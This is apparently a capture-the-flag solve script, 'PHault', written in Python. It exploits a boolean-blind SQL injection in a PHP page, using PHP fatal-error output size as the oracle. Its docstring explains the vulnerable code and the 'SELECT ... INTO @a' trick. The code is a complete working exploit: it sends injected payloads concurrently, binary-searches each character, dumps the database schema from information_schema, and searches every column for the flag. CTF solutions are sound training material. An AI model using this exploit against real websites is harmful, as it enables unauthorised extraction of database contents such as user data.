#!/usr/bin/env python3
"""PHault -- boolean-blind SQLi with a PHP-fatal oracle.

index.php:

    register_shutdown_function(...pad every response to 2.0s...);  // no timing attack!!
    mysqli_report(MYSQLI_REPORT_OFF);
    $sql = "SELECT username FROM users WHERE id = " . $_GET["id"];
    $res = $db->query($sql);
    if (!$res) { die("ill try to tell him, dw"); }
    $row = $res->fetch_row();
    echo 'ill try to tell him, dw';

Success and failure print byte-identical bodies (4557 bytes, verified with cmp), every
response is padded to exactly 2.0s, and MySQL kills slow SELECTs so SLEEP/BENCHMARK do
nothing. So neither content nor timing is an oracle.

The oracle is PHP, not SQL: `mysqli::query()` returns **true** rather than a result object
for a statement that yields no result set. `SELECT ... INTO @var` is exactly such a
statement, so `$res` becomes `true` and `$res->fetch_row()` raises

    Fatal error: Uncaught Error: Call to a member function fetch_row() on bool

which `display_errors` (proven on with `?id[]=1`) prints. That makes the response 4744
bytes instead of 4557:

    4744 -> the injected SQL was VALID
    4557 -> the injected SQL ERRORED (die path)

Turning that into a boolean test: make validity depend on the predicate by putting a
subquery that returns two rows on the false branch, evaluated once outside any row context
so an empty `users` lookup cannot short-circuit it:

    ?id=(SELECT IF(<predicate>,1,(SELECT 1 UNION SELECT 2))) INTO @a

Every request costs ~2s of server-side padding, so bits are fetched concurrently.

Usage: solve.py <host> [--threads N]
"""
import argparse
import concurrent.futures as cf
import string
import sys
import urllib.parse

import requests

TRUE_SIZE = 4744
FALSE_SIZE = 4557


class Oracle:
    def __init__(self, host: str, threads: int = 16):
        self.base = f"https://{host}/"
        self.threads = threads
        self.queries = 0
        self.s = requests.Session()
        self.s.verify = False
        a = requests.adapters.HTTPAdapter(pool_connections=threads, pool_maxsize=threads,
                                          max_retries=3)
        self.s.mount("https://", a)

    def ask(self, predicate: str) -> bool:
        inj = f"(SELECT IF({predicate},1,(SELECT 1 UNION SELECT 2))) INTO @a"
        url = self.base + "?id=" + urllib.parse.quote(inj)
        for _ in range(4):
            r = self.s.get(url, timeout=60)
            n = len(r.content)
            if n in (TRUE_SIZE, FALSE_SIZE):
                self.queries += 1
                return n == TRUE_SIZE
        raise RuntimeError(f"unexpected response size {n} for {predicate!r}")

    def ask_many(self, predicates):
        with cf.ThreadPoolExecutor(self.threads) as ex:
            return list(ex.map(self.ask, predicates))

    # ---- extraction -------------------------------------------------------
    def length(self, expr: str, hi: int = 512) -> int:
        lo = 0
        while lo < hi:                      # binary search on LENGTH()
            mid = (lo + hi + 1) // 2
            if self.ask(f"LENGTH(({expr}))>={mid}"):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def string(self, expr: str, n: int | None = None, label: str = "") -> str:
        if n is None:
            n = self.length(expr)
        out = [""] * n

        def one(i: int) -> str:
            lo, hi = 0, 127                 # binary search each byte via ORD()
            while lo < hi:
                mid = (lo + hi) // 2
                if self.ask(f"ORD(SUBSTRING(({expr}),{i+1},1))>{mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            return chr(lo)

        with cf.ThreadPoolExecutor(self.threads) as ex:
            for i, ch in zip(range(n), ex.map(one, range(n))):
                out[i] = ch
        s = "".join(out)
        print(f"  {label or expr} ({n}) = {s!r}", flush=True)
        return s


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("--threads", type=int, default=16)
    args = ap.parse_args()

    requests.packages.urllib3.disable_warnings()
    o = Oracle(args.host, args.threads)

    print("[*] sanity:", o.ask("1=1"), o.ask("1=2"))

    print("[*] schema")
    o.string("SELECT DATABASE()", label="database")
    tables = o.string(
        "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables "
        "WHERE table_schema=DATABASE()", label="tables")
    cols = o.string(
        "SELECT GROUP_CONCAT(CONCAT(table_name,'.',column_name)) "
        "FROM information_schema.columns WHERE table_schema=DATABASE()", label="columns")

    # hunt for the flag wherever it lives
    print("[*] flag hunt")
    for tbl_col in cols.split(","):
        if "." not in tbl_col:
            continue
        t, c = tbl_col.split(".", 1)
        expr = (f"SELECT GROUP_CONCAT(`{c}`) FROM `{t}` "
                f"WHERE `{c}` LIKE '%pwnsec{{%'")
        if o.ask(f"({expr}) IS NOT NULL"):
            val = o.string(expr, label=f"FLAG in {t}.{c}")
            print("FLAG:", val)
            print(f"[*] {o.queries} oracle queries")
            return 0

    print("[!] no flag found in listed columns; tables=", tables, file=sys.stderr)
    print(f"[*] {o.queries} oracle queries")
    return 1


if __name__ == "__main__":
    sys.exit(main())
